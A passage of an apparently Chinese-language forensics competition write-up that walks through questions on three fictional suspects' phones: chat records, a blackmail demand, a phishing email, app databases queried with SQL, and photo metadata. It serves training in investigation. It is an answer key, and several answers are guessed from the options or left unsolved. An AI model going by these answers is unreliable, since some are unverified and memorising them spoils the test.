+</h1><h2 id="1王晓琳手机的imei号是什么以阿拉伯数字回答">1.王晓琳手机的IMEI号是什么?(以阿拉伯数字回答)
+</h2><p><img src="http://picture.928330.xyz/typora/image-20250813180119718.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813180119718"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>352978115584444
+</span></span></code></pre></div><h2 id="2王晓琳的手机安装了什么即时通讯软件lnstant-messaging-apps">2.王晓琳的手机安装了什么即时通讯软件(lnstant Messaging Apps)?
+</h2><p><strong>A. Signal</strong></p>
+<p><strong>B. 微信(WeChat)</strong></p>
+<p><strong>C. QQ</strong></p>
+<p><strong>D. WhatsApp</strong></p>
+<p><strong>E. LINE</strong></p>
+<p>在应用列表看到了<strong>微信</strong>和<strong>WhatsApp</strong>，说明这一题是多选啊</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813181502609.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813181502609"
+	
+	
+></p>
+<p>在基本信息 -&gt; 应用列表里面过滤应用分类为&quot;即时通信&quot;，又发现一个没有显示的<strong>Signal</strong>：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813181914269.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813181914269"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ABD
+</span></span></code></pre></div><h2 id="3王晓琳于什么日子和时间曾经通过即时通讯软件发出一个pdf档案以时区utc8回答">3.王晓琳于什么日子和时间曾经通过即时通讯软件发出一个PDF档案?(以时区UTC+8回答)
+</h2><p><strong>A.2022-09-30 17:39:53</strong></p>
+<p><strong>B.2022-10-01 17:39:53</strong></p>
+<p><strong>C.2022-09-30 18:30:28</strong></p>
+<p><strong>D.2022-10-01 16:30:22</strong></p>
+<p>在WhatsApp的文件传输记录里找到一个名为staff A team.pdf：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813182714049.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813182714049"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>A
+</span></span></code></pre></div><h2 id="4承上题这个-pdf-档案的md5哈希值hash-value-是什么以大写英文及阿拉伯数字回答">4.承上题，这个 PDF 档案的MD5哈希值(Hash Value) 是什么?(以大写英文及阿拉伯数字回答)
+</h2><p>这个文件在挂载中好像改了名，变成了内部编号，所以我们在文件里面搜索不到</p>
+<p>不过直接在上题的聊天记录里面点击，就能在本地文件管理器找到挂载的这个pdf文件了：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813184423743.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813184423743"
+	
+	
+></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813184510972.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813184510972"
+	
+	
+></p>
+<p>之后不管是用poweshell，还是在火眼里面计算都可以：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813184659606.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813184659606"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>AE0D6735BBE45B0B8F1AB7838623D9C8
+</span></span></code></pre></div><h2 id="5王晓琳将这个pdf档案发给哪一个用户而该用户的手机号码是什么">5.王晓琳将这个PDF档案发给哪一个用户,而该用户的手机号码是什么?
+</h2><p><strong>A.85297663607</strong></p>
+<p><strong>B.85259308538</strong></p>
+<p><strong>C.85269707307</strong></p>
+<p><strong>D.85246427813</strong></p>
+<p>在好友消息里面一个个查找就行：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813185156416.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813185156416"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>B
+</span></span></code></pre></div><h2 id="6王晓琳发出这个pdf档案的原因是什么">6.王晓琳发出这个PDF档案的原因是什么?
+</h2><p><strong>A.寻求协助</strong></p>
+<p><strong>B.分享档案内容</strong></p>
+<p><strong>C.错误发出</strong></p>
+<p><strong>D.无法开启</strong></p>
+<p>看一下聊天记录就知道了：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813185325090.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813185325090"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>D
+</span></span></code></pre></div><h2 id="7承上题分析王晓琳与上述用户的对话他们的关系是什么">7.承上题，分析王晓琳与上述用户的对话，他们的关系是什么?
+</h2><p><strong>A. 客户</strong></p>
+<p><strong>B. 师生</strong></p>
+<p><strong>C. 家人</strong></p>
+<p><strong>D. 同事</strong></p>
+<p>同样是查看聊天记录，有电脑部、返工等等字样，应该是同事：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813185522647.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813185522647"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>D
+</span></span></code></pre></div><p>其实从这里也就能看出，对方就是本案件嫌疑人林俊熙，两人应该是从同事变成恋人，而后分手</p>
+<p>后面的照片也和案件调查的内容对应上了</p>
+<h2 id="8王晓琳于何时要求上述用户删除一张照片">8.王晓琳于何时要求上述用户删除一张照片?
+</h2><p><strong>A. 2022-10-06</strong></p>
+<p><strong>B. 2022-09-28</strong></p>
+<p><strong>C. 2022-09-30</strong></p>
+<p><strong>D. 2022-10-03</strong></p>
+<p>依旧聊天记录：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813185846382.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813185846382"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>D
+</span></span></code></pre></div><h2 id="9承上题该用户向王晓琳提出什么要求以删除这张照片">9.承上题，该用户向王晓琳提出什么要求以删除这张照片?
+</h2><p><strong>A. 金钱</strong></p>
+<p><strong>B. 毒品</strong></p>
+<p><strong>C. 性服务</strong></p>
+<p><strong>D. 加密货币</strong></p>
+<p>同上题图，“比钱我就删除”，就是要钱</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>A
+</span></span></code></pre></div><h2 id="10王晓琳的手机里有什么电子书籍electronic-book-">10.王晓琳的手机里有什么电子书籍(Electronic Book) ?
+</h2><p><strong>A. 三国演义</strong></p>
+<p><strong>B. 红楼梦</strong></p>
+<p><strong>C. 水浒传</strong></p>
+<p><strong>D. 西游记</strong></p>
+<p>首先的思路就是去找有没有相关的app，但是现在支持详细分析的似乎没有一个是电子书阅读平台</p>
+<p>所以接下来就是去翻第二题找过的应用列表，但我也不知道哪个是阅读软件，所以要请出伟大的ai大人了</p>
+<p>不知道为什么我不能导出成csv，只能一段段截图喂给ai了：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814100941088.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814100941088"
+	
+	
+></p>
+<p>ai真是太好用了你们知道吗</p>
+<p>但很遗憾，就算我找到了电子阅读书的软件，也不知道在哪找书的数据</p>
+<p>所以换一个思路，直接使用火眼的全局搜索功能把所有选项都找一遍：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814090331769.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814090331769"
+	
+	
+></p>
+<p>很幸运第一个选项三国演义就找到了：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814090353096.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814090353096"
+	
+	
+></p>
+<p>D选项当然也是没有的：
+<img src="http://picture.928330.xyz/typora/image-20250814101817637.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814101817637"
+	
+	
+></p>
+<pre tabindex="0"><code>A
+</code></pre><h2 id="11王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果highlight">11.王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果(Highlight)?
+</h2><p><strong>A. 卿有何妙计</strong></p>
+<p><strong>B. 宝玉已是三杯过去了</strong></p>
+<p><strong>C. 武松那日早饭罢</strong></p>
+<p><strong>D. 就除他做个弼马温罢</strong></p>
+<p>不知道怎么找，直接看选项</p>
+<p>选项B是红楼梦，C是水浒传，D应该是西游记，A就应该是三国演义了：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814101525488.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814101525488"
+	
+	
+></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814101545665.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814101545665"
+	
+	
+></p>
+<p>为了保险我们直接全局搜索AD两项，也是很幸运，A又搜到了：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814101440840.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814101440840"
+	
+	
+></p>
+<pre tabindex="0"><code>A
+</code></pre><h2 id="12王晓琳的手机里有一个-mtr-mobile-港铁的手机程序mobile-app检视其数据库database-的数据王晓琳于2022年10月11日-2204-时将一行程加入书签bookmark这段行程的起点及终点站包括">12.王晓琳的手机里有一个 &lsquo;MTR Mobile &lsquo;(港铁)的手机程序(Mobile App)。检视其数据库(Database) 的数据，王晓琳于2022年10月11日 22:04 时将一行程加入书签(Bookmark)，这段行程的起点及终点站包括?
+</h2><p><strong>A. 尖沙咀</strong></p>
+<p><strong>B. 红硒</strong></p>
+<p><strong>C. 康城</strong></p>
+<p><strong>D. 青衣</strong></p>
+<p><strong>E. 沙田</strong></p>
+<p>直接在文件系统里面搜索MTR，可以在搜出来的同级目录下找到一个数据库：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813202924289.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813202924289"
+	
+	
+></p>
+<p>此外在MTRmobile文件夹下也有很多的数据库，不过我们先一个一个试，用SQLite类型连接数据库：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250813210514140.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813210514140"
+	
+	
+></p>
+<p>这里面很多字段和选项一样，可能是找对了</p>
+<p>CREATE_DATE字段</p>
+<p>我们需要搜索2022年10月11日22:04之后的条目，先找个网站转换时间戳：</p>
+<p><a class="link" href="https://tool.chinaz.com/tools/unixtime.aspx"  target="_blank" rel="noopener"
+    >https://tool.chinaz.com/tools/unixtime.aspx
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814101630078.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814101630078"
+	
+	
+></p>
+<p>使用sql语句在表里面查询：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> 
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">FROM</span> <span style="color:#e06c75">BookmarkNHistory</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">CREATED_DATE</span> <span style="color:#56b6c2">&gt;=</span> <span style="color:#d19a66">1665497040</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">ORDER</span> <span style="color:#c678dd">BY</span> <span style="color:#e06c75">CREATED_DATE</span>;
+</span></span></code></pre></div><p>只查询出来一条语句，应该就是目标：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814101722172.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814101722172"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>DE
+</span></span></code></pre></div><h2 id="13王晓琳于2022年10月2日使用她的手机拍摄了多少张的照片以阿拉伯数字回答">13.王晓琳于2022年10月2日使用她的手机拍摄了多少张的照片?(以阿拉伯数字回答)
+</h2><p>基本信息 -&gt; 图片，把创建时间改成2022-10-2当天：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814102214879.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814102214879"
+	
+	
+></p>
+<p>每一张最好都看一下，我大致看了，应该都是风景照没错</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>90
+</span></span></code></pre></div><h2 id="14检视王晓琳的手机照片她于2022年10月2日到过什么地方">14.检视王晓琳的手机照片，她于2022年10月2日到过什么地方?
+</h2><p><strong>A.大潭郊游径</strong></p>
+<p><strong>B.城门畔塘径</strong></p>
+<p><strong>C.大榄麦理浩径</strong></p>
+<p><strong>D.京士柏卫理径</strong></p>
+<p>看来上一题全部看一遍是正确的，我们能找到这样一张图片：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814102445543.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814102445543"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>B
+</span></span></code></pre></div><h1 id="李大辉的phone15-24">李大辉的Phone(15-24)
+</h1><h2 id="15李大辉使用的是一台lg-v10的手机它的型号是什么">15.李大辉使用的是一台LG V10的手机，它的型号是什么?
+</h2><p><strong>A. LGH960C</strong></p>
+<p><strong>B. LGH961N</strong></p>
+<p><strong>C. LGH960H</strong></p>
+<p><strong>D. LGH961C</strong></p>
+<p><strong>E. LGH961D</strong></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814111807409.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814111807409"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>B
+</span></span></code></pre></div><h2 id="16李大辉的手机最常搜索的类别category-是什么">16.李大辉的手机最常搜索的类别(Category) 是什么?
+</h2><p><strong>A. 护肤品</strong></p>
+<p><strong>B. 旅游</strong></p>
+<p><strong>C. 运动</strong></p>
+<p><strong>D. 学校</strong></p>
+<p>查看chrome浏览器的历史记录，发现最多的是关于化妆品一类的：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814112129286.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814112129286"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>A
+</span></span></code></pre></div><h2 id="17李大辉最近光顾了一家美丰快运公司这快递件的单号是什么不要输入符号及空白以阿拉伯数字回答">17.李大辉最近光顾了一家美丰快运公司，这快递件的单号是什么?(不要输入符号及空白，以阿拉伯数字回答)
+</h2><p>这题不会</p>
+<p>先是看了一遍图片，没有找到快递相关的东西</p>
+<p>又跑到文件里面找图片，七千多张翻了二十多页，啥也没有，太耗时间了，还给我火眼整的卡卡的</p>
+<p>我想到耗时任务里面有图片文字提取，但是使用要苍穹ai引擎，而且也没有关键词，不一定好找</p>
+<p>接着又在浏览器里面找，还是没有快递相关，遂放弃</p>
+<h2 id="18李大辉收到的电邮中有一个钓鱼链结phishing-link这个链结的地址是什么">18.李大辉收到的电邮中有一个钓鱼链结(Phishing Link)，这个链结的地址是什么?
+</h2><p><strong>A. 以上皆非</strong></p>
+<p><strong>B. <a class="link" href="https://bit.ly/3yeARcO"  target="_blank" rel="noopener"
+    >https://bit.ly/3yeARcO
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></strong></p>
+<p><strong>C. <a class="link" href="https://bit.ly/5vM12"  target="_blank" rel="noopener"
+    >https://bit.ly/5vM12
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></strong></p>
+<p><strong>D. <a class="link" href="http://bit.ly/Hell0"  target="_blank" rel="noopener"
+    >http://bit.ly/Hell0
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></strong></p>
+<p>在Gmail里面能找到：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814114714799.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814114714799"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>B
+</span></span></code></pre></div><h2 id="19承上题这封电邮是从哪个电邮地址寄出的">19.承上题，这封电邮是从哪个电邮地址寄出的?
+</h2><p><strong>A. 以上皆非</strong></p>
+<p><strong>B. <a class="link" href="mailto:Cavinchow456@yahoo.com" >Cavinchow456@yahoo.com
+    
+</a></strong></p>
+<p><strong>C. <a class="link" href="mailto:2020ChanChan@hotmail.com" >2020ChanChan@hotmail.com
+    
+</a></strong></p>
+<p><strong>D. <a class="link" href="mailto:30624700Peter@proton.me" >30624700Peter@proton.me
+    
+</a></strong></p>
+<p>同上题图</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>D
+</span></span></code></pre></div><h2 id="20承上题寄出这封电邮的ip地址是">20.承上题，寄出这封电邮的IP地址是?
+</h2><p><strong>A. 以上皆非</strong></p>
+<p><strong>B. 65.54.185.39</strong></p>
+<p><strong>C. 10.13.105.56</strong></p>
+<p><strong>D. 58.152.110.218</strong></p>
+<p>这题我也不知道怎么做，查看了Gmail的</p>
+<p>不过10开头的好像是内网地址，不能在公网上路由？那也只能排除C</p>
+<h2 id="21李大辉手机有一个orderxlsx-的档案被加密了解密钥匙是什么">21.李大辉手机有一个order.xlsx 的档案被加密了，解密钥匙是什么?
+</h2><p><strong>A. 2022 Nov!</strong></p>
+<p><strong>B. 20221101</strong></p>
+<p><strong>C. Nov2022!</strong></p>
+<p><strong>D. P@sswOrd!</strong></p>
+<p>这一题答案在图片中，或许应该庆幸十七题我把所有图片都看了一遍：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814115556797.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814115556797"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>C
+</span></span></code></pre></div><p>不过这个选择题就四个选项，找到加密文件全部试一遍也试出来了，有点意义不明</p>
+<h2 id="22香港的街道上每一枝街灯都有编号分析李大辉手机里的程序-kmb-1933-哪一枝街灯在经度-latitude-224160270000-纬度-longitude-1142139450000-附近它的编号是什么以大㝍英文及阿拉伯数字回答">22.香港的街道上每一枝街灯都有编号。分析李大辉手机里的程序 &lsquo;KMB 1933&rsquo;， 哪一枝街灯在经度 (Latitude) 22.4160270000， 纬度 (Longitude) 114.2139450000 附近，它的编号是什么?(以大㝍英文及阿拉伯数字回答)
+</h2><p>和十二题一样，搜索KMB，在文件目录下找到数据库：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814121253302.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814121253302"
+	
+	
+></p>
+<p>链接之后，找到kmb_routestopfile_ST表，只有这个表里面有经纬度：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814121239693.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814121239693"
+	
+	
+></p>
+<p>sql进行模糊查询：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">FROM</span> <span style="color:#e06c75">kmb_routestopfile_ST</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">lat</span> <span style="color:#c678dd">BETWEEN</span> <span style="color:#d19a66">22</span>.<span style="color:#d19a66">416027</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0</span>.<span style="color:#d19a66">0005</span> <span style="color:#c678dd">AND</span> <span style="color:#d19a66">22</span>.<span style="color:#d19a66">416027</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0</span>.<span style="color:#d19a66">0005</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">AND</span> <span style="color:#e06c75">lng</span> <span style="color:#c678dd">BETWEEN</span> <span style="color:#d19a66">114</span>.<span style="color:#d19a66">213945</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0</span>.<span style="color:#d19a66">0005</span> <span style="color:#c678dd">AND</span> <span style="color:#d19a66">114</span>.<span style="color:#d19a66">213945</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0</span>.<span style="color:#d19a66">0005</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">ORDER</span> <span style="color:#c678dd">BY</span> <span style="color:#c678dd">ABS</span>(<span style="color:#e06c75">lat</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">22</span>.<span style="color:#d19a66">416027</span>) <span style="color:#56b6c2">+</span> <span style="color:#c678dd">ABS</span>(<span style="color:#e06c75">lng</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">114</span>.<span style="color:#d19a66">213945</span>)
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">LIMIT</span> <span style="color:#d19a66">10</span>;
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250814121717560.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814121717560"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>CE1453
+</span></span></code></pre></div><h2 id="23李大辉的手机里有一张由该手机拍的照片照片的元资料metadata-曾被修改这张照片的档案名是什么以大写英文及数字回答不用回答副档名">23.李大辉的手机里有一张由该手机拍的照片，照片的元资料(Metadata) 曾被修改，这张照片的档案名是什么?(以大写英文及数字回答，不用回答副档名
+</h2><p>在Android.bin/分区57/media/0/DCIM/Camera路径下查看手机照片的创建时间和修改时间</p>
+<p>发现只有一张图片的c和m时间不一样：
+<img src="http://picture.928330.xyz/typora/image-20250814122126266.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814122126266"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>20220922_152622.jpg
+</span></span></code></pre></div><h2 id="24分析李大辉的手机里的资料他在哪一间公司工作">24.分析李大辉的手机里的资料，他在哪一间公司工作?
+</h2><p><strong>A. 美丽好化妆品公司</strong></p>
+<p><strong>B. 步步高贸易公司</strong></p>
+<p><strong>C. 盛大国际有限公司</strong></p>
+<p><strong>D. 永恒化妆品公司</strong></p>
+<p>微信和whatsapp都没有相关工作消息，最后在文件的pdf中找到了职员证：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814122928297.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814122928297"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>A
+</span></span></code></pre></div><h1 id="林浚熙的iphone25-38">林浚熙的iphone(25-38)
+</h1><h2 id="25林浚熙曾经以手机登录google账户的验证码是什么不要输入符号以大写英文及阿拉伯数字回答">25.林浚熙曾经以手机登录Google账户的验证码是什么?(不要输入符号，以大写英文及阿拉伯数字回答)
+</h2><p>翻阅短信：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814123330799.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814123330799"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>G-785186
+</span></span></code></pre></div><h2 id="26林浚熙手机的-whatsapp-号码是什么号码swhatsappnet-以阿拉伯数字回答">26.林浚熙手机的&rsquo; WhatsApp&rsquo; 号码是什么?(号码)@s.whatsapp.net? (以阿拉伯数字回答)
+</h2><p><img src="http://picture.928330.xyz/typora/image-20250814123444032.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814123444032"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>85259308538
+</span></span></code></pre></div><h2 id="27通过分析林浚熙手机的照片判断他在何处偷拍王晓琳">27.通过分析林浚熙手机的照片，判断他在何处偷拍王晓琳?
+</h2><p><strong>A. 交通工具</strong></p>
+<p><strong>B. 郊野公园</strong></p>
+<p><strong>C. 游泳池</strong></p>
+<p><strong>D. 酒店房间</strong></p>
+<p>照片在之前王晓琳的聊天记录里面已经看到过，是酒店</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>D
+</span></span></code></pre></div><h2 id="28林浚熙曾经删掉自己拍摄的照片这张照片的档案名filename-是什么不要输入以大写英文及阿拉伯数字回答如cat10jpg需回答cat10jpg">28.林浚熙曾经删掉自己拍摄的照片，这张照片的档案名(Filename) 是什么?(不要输入，以大写英文及阿拉伯数字回答。如Cat10.jpg，需回答CAT10JPG)
+</h2><p><img src="http://picture.928330.xyz/typora/image-20250814123842272.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814123842272"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>IMG_0444.JPG
+</span></span></code></pre></div><h2 id="29王晓琳曾经发送一个pdf档案予林浚熙这个档案的文件签名file-signature-是什么以十六进制数字答首八位数值如foa1c5e1">29.王晓琳曾经发送一个PDF档案予林浚熙，这个档案的文件签名(File Signature) 是什么?(以十六进制数字答首八位数值，如FOA1C5E1)
+</h2><p>在本地资源管理器找到这个pdf，随便一个十六进制编辑器打开：
